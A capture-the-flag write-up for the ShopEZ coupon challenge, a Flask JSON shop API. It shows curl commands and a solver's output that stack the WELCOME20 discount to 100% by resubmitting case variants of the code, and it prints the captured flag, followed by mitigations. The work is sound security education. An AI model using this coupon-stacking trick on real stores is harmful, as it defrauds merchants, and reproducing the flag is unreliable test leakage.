# ShopEZ Coupon Collector Challenge

<div class="grid cards" markdown>

- :material-information-outline: &nbsp; **Challenge Info**

    ---

  - 🏷️ **Category:** API · Business Logic
  - ⚡ **Difficulty:** 🟡 Easy/Medium
  - 💻 **Platform:** Fluid Attacks CTF 2026-2
  - 🎯 **Target:** [chal.ctf.ae](https://c38d56f0073a9aba.chal.ctf.ae/)
  - 🚩 **Flag:** `flag{b4f0e056a0639f66}`

- :material-tools: &nbsp; **Tools Required**

    ---

  - `curl` — Manual endpoint probing & session cookie jar
  - `python3` (`requests`) — Automated case-variant coupon-stacking exploit

</div>

!!! abstract "Challenge Description"
    ShopEZ is a Flask/gunicorn JSON REST API with cookie-based sessions
    (`/api/products`, `/api/cart`, `/api/apply-coupon`, `/api/checkout`). The `WELCOME20`
    coupon takes 20% off; the goal is to drive the cart total low enough that
    `/api/checkout` returns the flag. The session is a client-side
    `itsdangerous`-signed cookie carrying the full cart/discount state — there is no
    server-side session store.

## Description

> ShopEZ is having a sale: `WELCOME20` takes 20% off. Generous.

JSON REST API with cookie-based sessions. Endpoints: `/api/products`, `/api/cart`,
`/api/apply-coupon`, `/api/checkout`. Goal: get the cart total low enough (the flag is
returned by `/api/checkout`).

---

## Endpoints

| Method | Route                | Description                                   |
|--------|----------------------|------------------------------------------------|
| GET    | `/api/products`      | List products (id, name, price)                |
| GET    | `/api/cart`           | View cart, applied coupons, discount, total     |
| POST   | `/api/cart`           | Add `{"product_id":..,"quantity":..}` to cart   |
| POST   | `/api/apply-coupon`   | Apply `{"coupon":"CODE"}` to the cart           |
| POST   | `/api/checkout`       | Finalize order → returns flag if total is 0     |

The session is a Flask/`itsdangerous`-signed cookie carrying the full state
(`applied_coupons`, `cart`, `discount`) base64-encoded in the client — there is no
server-side session store.

---

## Recon

A prior attempt against an earlier instance (`7bc8e9217a4452e1.chal.ctf.ae`) found every
route returning `404` — the container had gone down between the challenge being queued and
worked on (see stale `recon_notes.md`/`recon.py`/`ffuf_results.json` from that session, kept
for reference). The instance was restarted on a new subdomain
(`c38d56f0073a9aba.chal.ctf.ae`), which responded normally to `GET /api/products`.

```bash
curl -s https://c38d56f0073a9aba.chal.ctf.ae/api/products
# {"products":[{"id":1,"name":"Wireless Headphones","price":59.99}, ...]}
```

Adding an item and applying the coupon showed the expected 20% off, and reapplying the same
code was rejected:

```bash
curl -s -c c.txt -b c.txt -X POST $B/api/cart -d '{"product_id":1,"quantity":1}' -H 'Content-Type: application/json'
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"WELCOME20"}' -H 'Content-Type: application/json'
# {"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":47.99}
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"WELCOME20"}' -H 'Content-Type: application/json'
# {"error":"Coupon already applied"}
```

Trying other guessed coupon codes (`SAVE10`, `FLASH50`, `VIP`, `ADMIN100`, …) all returned
`{"error":"Invalid coupon code"}` — `WELCOME20` is the only valid code.

---

## Exploitation

The duplicate check compares the submitted code **exactly** (case-sensitive) against the
`applied_coupons` list already stored in the session, but the coupon **lookup/validation**
that grants the discount is **case-insensitive**. Submitting case variants of the same code
each pass the "already applied" check as a *new* string while the backend still resolves
them to the same `WELCOME20` coupon and grants another 20% off:

```bash
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"welcome20"}' -H 'Content-Type: application/json'
# {"discount_percent":40.0, "total":35.99}
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"welcomE20"}' -H 'Content-Type: application/json'
# {"discount_percent":60.0, "total":24.0}
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"welcoMe20"}' -H 'Content-Type: application/json'
# {"discount_percent":80.0, "total":12.0}
curl -s -c c.txt -b c.txt -X POST $B/api/apply-coupon -d '{"coupon":"welcoME20"}' -H 'Content-Type: application/json'
# {"discount_percent":100.0, "total":0.0}
```

Five distinct case variants of `WELCOME20` (`WELCOME20`, `welcome20`, `welcomE20`,
`welcoMe20`, `welcoME20`) stack the discount to 100%, bringing the cart total to `0.0`.
Calling `/api/checkout` on a zero-total cart returns the flag.

Full exploit: `scripts/solve.py` — adds one item to the cart, walks
through case-permutations of `WELCOME20` until the discount reaches 100%, then checks out.

```bash
$ python3 scripts/solve.py
add_to_cart: 200 {"cart_size":1,"message":"Added Wireless Headphones to cart"}
before applying 'welcome20': total=59.99 discount%=0.0
 -> 200 {'discount_percent': 20.0, 'message': "Coupon 'welcome20' applied!", 'total': 47.99}
before applying 'welcomE20': total=47.99 discount%=20.0
 -> 200 {'discount_percent': 40.0, 'message': "Coupon 'welcomE20' applied!", 'total': 35.99}
before applying 'welcoMe20': total=35.99 discount%=40.0
 -> 200 {'discount_percent': 60.0, 'message': "Coupon 'welcoMe20' applied!", 'total': 24.0}
before applying 'welcoME20': total=24.0 discount%=60.0
 -> 200 {'discount_percent': 80.0, 'message': "Coupon 'welcoME20' applied!", 'total': 12.0}
before applying 'welcOme20': total=12.0 discount%=80.0
 -> 200 {'discount_percent': 100.0, 'message': "Coupon 'welcOme20' applied!", 'total': 0.0}
Discount maxed out, attempting checkout...

Final cart state: {'applied_coupons': ['welcome20', 'welcomE20', 'welcoMe20', 'welcoME20', 'welcOme20'], 'cart': [{'id': 1, 'name': 'Wireless Headphones', 'price': 59.99}], 'discount_amount': 59.99, 'discount_percent': 100.0, 'subtotal': 59.99, 'total': 0.0}

Checkout:
(200, '{"flag":"flag{b4f0e056a0639f66}","message":"Order completed!","order_id":"763dca30","total":0.0}\n')
```

Reproduced with a fresh session — same flag, different `order_id`:

```
{"flag":"flag{b4f0e056a0639f66}","message":"Order completed!","order_id":"d379ebb2","total":0.0}
```

---

## Flag

```
flag{b4f0e056a0639f66}
```

---

## Vulnerability

**Type:** Improper enforcement of a business rule — coupon-reuse check bypassed via
case-sensitivity mismatch between the dedupe list and the (case-insensitive) coupon
validation, allowing unbounded discount stacking.
**CWE:** CWE-841 — Improper Enforcement of Behavioral Workflow
**OWASP API:** API6:2023 — Unrestricted Access to Sensitive Business Flows

The server stores applied coupons as raw strings and checks membership with an exact
(case-sensitive) comparison, while the coupon-code resolver normalizes case when looking up
the discount to apply. An attacker can resubmit the same real coupon under different
capitalizations to apply it as many times as there are distinct case permutations,
completely defeating the "one coupon per code" business rule and driving the order total to
zero (or beyond, if uncapped).

**Mitigation:**

- Normalize (`.upper()`/`.lower()`) the coupon code **before** both the validation lookup
  and the dedupe-list membership check/insertion, so both operate on the same canonical form.
- Enforce coupon stacking rules server-side against a canonical coupon identifier (e.g. a
  DB row/UUID), not the free-text code the client submitted.
- Recompute and validate the final total server-side at checkout independent of client-
  supplied discount state; reject orders where the discount exceeds the coupon's defined cap.

---

## Timeline

```
[1] GET  /api/products              → catalog, confirms JSON API is up (new instance)
[2] POST /api/cart                  → add 1x Wireless Headphones ($59.99)
[3] POST /api/apply-coupon WELCOME20→ 20% off, reapply rejected ("already applied")
[4] Guessed alternate coupon codes  → all invalid; WELCOME20 is the only real code
[5] POST /api/apply-coupon with case variants (welcome20/welcomE20/welcoMe20/welcoME20)
     → each bypasses the case-sensitive dedupe check, discount stacks 20→40→60→80→100%
[6] POST /api/checkout (total = 0.0) → FLAG
```

---

## Tools used

- `curl` (manual endpoint probing, cookie jar for session state)
- Python `requests` (`scripts/solve.py` — automated case-variant stacking exploit)
